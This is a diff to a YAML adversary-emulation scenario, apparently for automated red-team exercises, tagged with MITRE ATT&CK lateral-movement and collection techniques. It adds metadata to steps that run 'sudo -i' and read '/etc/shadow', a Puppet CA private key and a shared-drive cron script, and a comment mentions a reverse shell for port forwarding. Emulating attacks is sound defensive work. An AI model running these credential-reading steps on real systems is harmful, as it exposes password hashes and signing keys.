@@ -88,6 +88,7 @@ commands:
       techniques: "T1021.005"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: VNC"
+      action: "terminal"
 
   - type: sleep
     seconds: 3
@@ -108,6 +109,7 @@ commands:
       techniques: "T1021.005"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: VNC"
+      action: "sudo -i"
 
   - type: sleep
     seconds: 3
@@ -125,6 +127,8 @@ commands:
     session: foothold
     cmd: type
     input: "id"
+    metadata:
+      action: "id"
 
   - type: sleep
     seconds: 3
@@ -142,6 +146,8 @@ commands:
     session: foothold
     cmd: type
     input: "cat /etc/shadow"
+    metadata:
+      action: "cat /etc/shadow"
 
   - type: sleep
     seconds: 3
@@ -163,6 +169,8 @@ commands:
     session: foothold
     cmd: type
     input: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem"
+    metadata:
+      action: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem"
 
   - type: sleep
     seconds: 3
@@ -184,6 +192,8 @@ commands:
     session: foothold
     cmd: type
     input: "cat /media/share/healthcheck_cron.sh"
+    metadata:
+      action: "cat /media/share/healthcheck_cron.sh"
 
   - type: sleep
     seconds: 3
@@ -198,7 +208,7 @@ commands:
       technique_name: "Data from Network Shared Drive"
 
   - type: sleep
-    seconds: 2 
+    seconds: 2
 
 #  HERE THE REVERSE SHELL FOR PORTFORWARDING ON THE REPOSERVER IS ESTABLISHED
   - type: vnc
